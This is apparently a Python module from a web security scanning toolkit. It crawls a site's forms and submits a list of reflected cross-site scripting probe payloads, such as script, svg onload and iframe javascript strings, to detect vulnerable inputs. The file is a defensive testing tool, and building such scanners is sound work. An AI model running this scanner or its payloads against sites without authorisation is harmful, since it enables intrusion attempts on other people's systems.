import os
import sys
import argparse
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup as bs
from string import ascii_uppercase, ascii_lowercase

sys.path.append(os.path.abspath(os.path.join(__file__, os.pardir)) + '/..')
from Utils.helpers import *

# Local Consts
DEFAULT_HEADERS = {}
PAYLOAD = r'InJecTeD'

class XssScanner(object):
    def __init__(self, auth_cookie=None, standalone=False):
        """
        Class variables initialize.
        Creating directories for the results.
        """
        self.url = ''

        self.results = []
        self.headers = {}

        self._auth_cookie = auth_cookie
        self.headers['User-Agent'] = DEFAULT_USER_AGENT

        if standalone:
            make_results_dir(RESULTS_DIR_PATH)
            make_results_dir(XSS_RESULTS_PATH)

    def _xss_payloads(self):
        """ Cross-Site Scripting"""
        payload =  [r"<script>alert('"+PAYLOAD+"')</script>"]
        payload += [r"<script>alert('"+PAYLOAD+r"');</script>"]
        payload += [r"\'\';!--\"<"+PAYLOAD+r">=&{()}"]
        payload += [r"<script>a=/"+PAYLOAD+r"/"]
        payload += [r"<body onload=alert('"+PAYLOAD+r"')>"]
        payload += [r"<iframe src=javascript:alert('"+PAYLOAD+r"')>"]
        payload += [r"<x onxxx=alert('"+PAYLOAD+r"') 1='"]
        payload += [r"</script><svg onload=alert("+PAYLOAD+r")>"]
        payload += [r"<svg onload=alert('"+PAYLOAD+r"')>"]
        payload += [r"><script>"+PAYLOAD+""]
        payload += [r"\"><script>alert('"+PAYLOAD+"');</script>"]
        payload += [r"<  script > "+PAYLOAD+" < / script>"]
        return payload

    def _check_same_site(self, url):
        if urlparse(url).netloc == urlparse(self.url).netloc or urlparse(url).netloc == '':
            return True

    def get_all_forms(self, url):
        forms_found = []
    
        if self._auth_cookie is None:
            soup = bs(requests.get(url, headers=DEFAULT_HEADERS).content, "html.parser")
        else:
            DEFAULT_HEADERS['Cookie'] = self._auth_cookie
            soup = bs(requests.get(url, headers=DEFAULT_HEADERS).content, "html.parser")
        
        for form in soup.find_all("form"):
            if form.has_attr('action') and form.has_attr('method'):
                if self._check_same_site(form['action']):
                    forms_found.append(form)

        return forms_found

    def get_form_details(self, form):
        details = {}
        inputs = []
        
        try:
            action = form.attrs.get("action").lower()
            method = form.attrs.get("method", "get").lower()
            
            for input_tag in form.find_all("input"):
                input_type = input_tag.attrs.get("type", "text")
                input_name = input_tag.attrs.get("name")
                inputs.append({"type": input_type, "name": input_name})
            
            details["action"] = action
            details["method"] = method
            details["inputs"] = inputs

        except Exception as e:
            details = {}

        return details

    def submit_form(self, form_details, url, value):
        target_url = urljoin(url, form_details["action"])
        
        inputs = form_details["inputs"]
        data = {}
        
        for input in inputs:
            if input["type"] == "text" or input["type"] == "search":
                input["value"] = value
            input_name = input.get("name")
            input_value = input.get("value")
            if input_name and input_value:
                data[input_name] = input_value

        if form_details["method"] == "post":
            resp = requests.post(target_url, headers=DEFAULT_HEADERS, data=data)
            if resp.status_code == 200:
                return resp
        else:
            resp = requests.get(target_url, headers=DEFAULT_HEADERS, params=data)
            if resp.status_code == 200:
                return resp

        return None

    def scan(self, url):
        """
        Given a `url`, it prints all XSS vulnerable forms and 
        returns True if any is vulnerable, False otherwise
        """
        self.url = url
        final_results = []

        try:
            forms = self.get_all_forms(self.url)
            for form in forms:
                form_details = self.get_form_details(form)
                if form_details != {}:
                    for payload in self._xss_payloads():
                        content = self.submit_form(form_details, self.url, payload).content.decode()
                        if content is not None:
                            if payload in content:
                                self.results.append(form_details)
                                break

            for result in self.results:
                final_results.append({'URL': result['action'], 
                                      'XSS': list({v['name']: v for v in result['inputs']}.values())})

        except requests.exceptions.ConnectionError:
            pass
        except Exception as e:
            final_results = {"Error while tring to attack target": str(e)}

        return final_results
        

def get_args():
    """
    Get arguments for the XSS Scanner Module.
    """
    parser = argparse.ArgumentParser(description="XSS Scan Module",
                                     usage="xss.py -s <SITE>")

    parser.add_argument('-s','--site', help='The site to scan', required=True)
    parser.add_argument('-a','--standalone', help='Standalone Mode', required=False, action='store_true')
    parser.add_argument('-u','--user-id', help='User ID', required=False)

    return vars(parser.parse_args())

def main():
    """
    Main function.
    """
    args = get_args()
    scanner = XssScanner(standalone=args['standalone'])
    results = scanner.scan(args['site'])
    save_results_to_json(XSS_RESULTS_PATH, results, args['user_id'])
    
if __name__ == '__main__':
    main()
